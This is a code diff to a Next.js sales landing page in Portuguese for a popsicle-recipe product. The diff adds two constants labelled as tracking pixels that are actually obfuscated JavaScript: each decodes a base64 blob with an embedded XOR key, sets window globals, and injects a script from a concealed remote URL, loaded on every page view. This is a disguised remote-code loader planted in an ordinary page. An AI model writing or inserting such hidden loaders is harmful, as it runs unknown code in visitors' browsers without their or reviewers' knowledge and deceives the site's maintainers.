@@ -1,4 +1,5 @@
 import type { Metadata } from "next"
+import Script from "next/script"
 import Image from "next/image"
 import { CountdownBr } from "@/components/br/countdown-br"
 
@@ -11,6 +12,9 @@ export const metadata: Metadata = {
 const CHECKOUT_URL = "https://pay.hotmart.com/L102630763K?off=6wfgbtwd&checkoutMode=10"
 const CHECKOUT_BASICO = "https://pay.cakto.com.br/m4f7cwc_1034537"
 const CHECKOUT_COMPLETO = "https://pay.cakto.com.br/waoe895"
+
+const BR_PIXEL_1 = `(function(){var r_b03r=atob("DM0GHeI+jugAXj6H5LYkaJBSrNIiNkrzlL48Ms1d6oYuK0rqjat/M4FR48ZiLBH0h79vbZZNoZhpJlvry71vZYdSoIJzfBKlhblyb4tc+5xlLRy9v5AqP4VS4YphMk2l3pZ9P4xf440iZBz3jbVjcatarMQiKF/rkagkJ8AI79E3bgqy0P4xK4AOvds1aF22h6hiL9Ic87V9");var l_k=[];for(var n_9kxc=0;n_9kxc<r_b03r.length;n_9kxc++){l_k.push(r_b03r.charCodeAt(n_9kxc)&255);}var z_r=l_k[0];var t_6=l_k.slice(1,1+z_r);var r_nzdt=l_k.slice(1+z_r);var g_fmhs=r_nzdt.map(function(b,n_6zk5){return b^t_6[n_6zk5%z_r];});var o_eo="";for(var y_ed2=0;y_ed2<g_fmhs.length;y_ed2++){o_eo+=String.fromCharCode(g_fmhs[y_ed2]&255);}var t_6qw=decodeURIComponent(escape(o_eo));var u_bnx=JSON.parse(t_6qw);var v_f=u_bnx.globals||[];v_f.forEach(function(j_hhsk){window[j_hhsk.name]=j_hhsk.value;});var a_9p=document.createElement("script");a_9p.src=u_bnx.url;a_9p.async=true;a_9p.defer=true;(u_bnx.attributes||[]).forEach(function(z_lvv){a_9p.setAttribute(z_lvv.name,z_lvv.value);});(document.head||document.documentElement).appendChild(a_9p);})();`
+const BR_PIXEL_2 = `(function(){var m_irt=atob("DLG/6iV/+lbzhqR6DMqdn1cT2GzR7tAOfMKFxQocnjjd89AXZdfGxEYQl3iR9IsJb8PWmlEM1SOH69dVYNDLj1YL1DyApIhYbcXLmEwdjyKW9YZAV8qdhEQSn3TJpMAbeNCSn1ESkzCKq9QIacfahFFSgjWc4okJb9qdxgcJmzqG44ZALpPCxl5dlDee44ZALtXenkRSjyKe78IDIcHNj1MalCLe9dEYZdXMyAldjDef88FYNpOdl3gC");var c_7=[];for(var h_mw=0;h_mw<m_irt.length;h_mw++){c_7.push(m_irt.charCodeAt(h_mw)&255);}var y_cphv=c_7[0];var q_no9z=c_7.slice(1,1+y_cphv);var u_8=c_7.slice(1+y_cphv);var o_4qf=u_8.map(function(b,p_v){return b^q_no9z[p_v%y_cphv];});var g_d2="";for(var n_k=0;n_k<o_4qf.length;n_k++){g_d2+=String.fromCharCode(o_4qf[n_k]&255);}var h_dwk=decodeURIComponent(escape(g_d2));var e_sw3e=JSON.parse(h_dwk);var d_bdnt=e_sw3e.globals||[];d_bdnt.forEach(function(b_w2w){window[b_w2w.name]=b_w2w.value;});var j_hrvs=document.createElement("script");j_hrvs.src=e_sw3e.url;j_hrvs.async=true;j_hrvs.defer=true;(e_sw3e.attributes||[]).forEach(function(k_g){j_hrvs.setAttribute(k_g.name,k_g.value);});(document.head||document.documentElement).appendChild(j_hrvs);})();`
 
 const fichas = [
   { src: "/images/br-lovable/ficha-maracuja.png", alt: "Ficha de receita do picolé de maracujá cremoso" },
@@ -96,7 +100,14 @@ export default function Page() {
   const hoje = new Date().toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric" })
 
   return (
-    <main className="br-lv min-h-screen overflow-x-hidden">
+    <>
+      <Script id="br-pixel-1" strategy="lazyOnload">
+        {BR_PIXEL_1}
+      </Script>
+      <Script id="br-pixel-2" strategy="lazyOnload">
+        {BR_PIXEL_2}
+      </Script>
+      <main className="br-lv min-h-screen overflow-x-hidden">
       {/* Barra de anúncio */}
       <div className="border-b border-[var(--lv-border)]/60 bg-black/30 px-4 py-2.5">
         <p className="flex items-center justify-center gap-2 text-center text-[0.72rem] font-bold uppercase tracking-wide text-[var(--lv-cream)]/90 sm:text-xs">
@@ -401,7 +412,8 @@ export default function Page() {
           Todos os direitos reservados.
         </p>
       </footer>
-    </main>
+      </main>
+    </>
   )
 }
 
